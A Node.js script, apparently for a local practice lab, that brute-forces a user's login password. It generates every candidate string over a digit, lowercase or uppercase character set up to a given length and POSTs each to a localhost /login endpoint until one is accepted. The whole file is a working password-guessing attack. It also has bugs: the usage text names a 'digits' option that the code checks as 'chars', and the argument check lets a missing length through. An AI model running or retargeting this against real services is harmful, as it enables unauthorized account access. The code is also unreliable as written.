function usage() {
    console.log('Usage: node crack.js <username> <charset> <maxlen>');
    console.log(' charset: digits | lower | upper');
    process.exit(1);
}

if (process.argv.length < 4) usage();

const USERNAME = process.argv[2];
const CHARSET_NAME = process.argv[3];
const MAXLEN = parseInt(process.argv[4], 10);

let CHARS = '';
if (CHARSET_NAME === 'chars') CHARS = '0123456789';
else if (CHARSET_NAME === 'lower') CHARS = 'abcdefghijklmnopqrstuvwxyz';
else if (CHARSET_NAME === 'upper') CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
else {
    console.error('Unknown charset:', CHARSET_NAME);
    usage();
}


console.log(`Target user: ${USERNAME}, charset=${CHARSET_NAME}, maxlen=${MAXLEN}`);
console.log('Starting local-only brute-force (Node). Stop with Ctrl+C.');

let found = false;

async function tryCandidate(candidate) {
    const url = "http://localhost:3000/login";
    console.log(`Trying candidate (masked): ${candidate.replace(/.(?=.{2})/g, '*')}`); // mask except last 2 chars

    const body = {username: USERNAME, password: candidate}; // lowercase keys (match server)
    try {
        const resp = await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });

        if (resp.status === 200) {
            console.log(`Found: ${candidate}`);
            found = true;
            return true;
        } else if (resp.status === 401) {
            return false;
        } else {
            // unexpected response
            const text = await resp.text().catch(() => '');
            console.warn('Unexpected response', resp.status, text);
            return false;
        }
    } catch (err) {
        console.error('Network/error:', err.message);
        return false;
    }
}

async function generateAndTest(chars, maxlen) {
    for (let len = 1; len <= maxlen; len++) {
        const idx = new Array(len).fill(0);
        while (true) {
            const candidate = idx.map(i => chars[i]).join('');
            await tryCandidate(candidate);
            if (found) return;
            let pos = len - 1;
            while (pos >= 0) {
                idx[pos]++;
                if (idx[pos] < chars.length) break;
                idx[pos] = 0;
                pos--;
            }
            if (pos < 0) break;
        }
    }
}

generateAndTest(CHARS.split(''), MAXLEN)
    .then(() => {
        if (!found) {
            console.log('No match found within given limits.');
            process.exit(1);
        }
    })
    .catch(err => {
        console.error('ERROR', err);
        process.exit(2);
    });
